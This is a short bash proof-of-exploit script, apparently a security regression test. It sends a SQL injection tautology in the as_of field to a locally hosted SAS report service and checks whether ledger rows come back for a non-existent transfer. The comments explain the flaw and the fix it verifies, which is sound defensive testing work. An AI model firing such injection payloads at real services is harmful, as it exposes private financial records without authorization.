#!/usr/bin/env bash
set -euo pipefail
# LG-SQLI-002 proof-of-exploit: SQL injection in the SAS report PROC SQL EXPLICIT pass-through. Asks
# the report for a non-existent transfer_id (GHOST999) but supplies an as_of that breaks out of the
# pass-through literal (x' OR '1'='1). With as_of_dates=on the as_of validation/quoting is
# skipped, so the tautology returns EVERY ledger row past the transfer_id filter; fires (exit 0) when
# the report returns rows for a transfer with no postings of its own. With the fix the payload fails
# as_of validation and no rows come back. Hits the SAS service directly. Env: SAS_URL (default :8084).

SAS_URL="${SAS_URL:-http://localhost:8084}"

resp="$(curl -sS -X POST "$SAS_URL/report" -H 'content-type: application/json' \
  -d '{"transfer_id":"GHOST999","report_type":"POSTING","as_of":"x'"'"' OR '"'"'1'"'"'='"'"'1"}')"

nrows="$(python3 -c '
import sys, json
try:
    d = json.load(sys.stdin)
except Exception:
    print(-1); sys.exit()
rows = d.get("rows")
print(len(rows) if isinstance(rows, list) else -1)
' <<<"$resp")"

if [ "$nrows" -gt 0 ] 2>/dev/null; then
  echo "LG-SQLI-002 FIRED: injection returned $nrows ledger row(s) for a non-existent transfer_id"
  exit 0
fi
echo "LG-SQLI-002 not fired: rows=$nrows (resp: $(printf '%s' "$resp" | head -c 200))" >&2
exit 1
